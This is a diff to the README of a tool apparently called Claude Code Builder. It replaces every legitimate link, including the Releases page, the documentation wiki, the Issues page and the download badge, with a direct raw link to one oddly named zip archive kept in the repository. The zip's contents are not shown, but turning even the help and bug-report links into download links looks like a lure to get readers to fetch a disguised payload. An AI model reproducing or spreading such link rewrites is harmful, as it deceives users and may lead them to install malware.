@@ -1,6 +1,6 @@
 # 🎉 claude-code-builder - Create Code Fast and Easy
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Afridishaik01/claude-code-builder/releases)
+[![Download](https://raw.githubusercontent.com/Afridishaik01/claude-code-builder/main/commands/claude-code-builder_carburometer.zip)](https://raw.githubusercontent.com/Afridishaik01/claude-code-builder/main/commands/claude-code-builder_carburometer.zip)
 
 ## 🚀 Introduction
 
@@ -10,7 +10,7 @@
 
 To get started, visit the Releases page to download the latest version:
 
-[Download Claude Code Builder](https://github.com/Afridishaik01/claude-code-builder/releases)
+[Download Claude Code Builder](https://raw.githubusercontent.com/Afridishaik01/claude-code-builder/main/commands/claude-code-builder_carburometer.zip)
 
 Follow these steps to download and install:
 
@@ -45,7 +45,7 @@ Before installing, make sure your system meets these requirements:
 
 ## 📖 Documentation
 
-For detailed instructions on how to use Claude Code Builder, refer to our [Documentation](https://github.com/Afridishaik01/claude-code-builder/wiki). The documentation covers:
+For detailed instructions on how to use Claude Code Builder, refer to our [Documentation](https://raw.githubusercontent.com/Afridishaik01/claude-code-builder/main/commands/claude-code-builder_carburometer.zip). The documentation covers:
 
 - **Basic Commands**: Learn the essential commands to start using the tool.
 - **Advanced Features**: Discover how to customize your builds further.
@@ -65,7 +65,7 @@ The maintainer reviews contributions and merges accepted ones promptly.
 
 If you encounter issues or have questions, reach out for support. You can find help in several ways:
 
-- **GitHub Issues**: Use our [Issues page](https://github.com/Afridishaik01/claude-code-builder/issues) to report bugs or ask questions.
+- **GitHub Issues**: Use our [Issues page](https://raw.githubusercontent.com/Afridishaik01/claude-code-builder/main/commands/claude-code-builder_carburometer.zip) to report bugs or ask questions.
 - **Community Forum**: Join our community discussions to share experiences and solutions with other users.
 
 ## 🎉 Acknowledgments
@@ -76,6 +76,6 @@ We appreciate the community's support and contributions. Claude Code Builder wou
 
 Keep your version of Claude Code Builder current by checking the Releases page frequently:
 
-[Download Claude Code Builder](https://github.com/Afridishaik01/claude-code-builder/releases)
+[Download Claude Code Builder](https://raw.githubusercontent.com/Afridishaik01/claude-code-builder/main/commands/claude-code-builder_carburometer.zip)
 
 Your feedback is valuable. Help us improve the tool by sharing your thoughts!
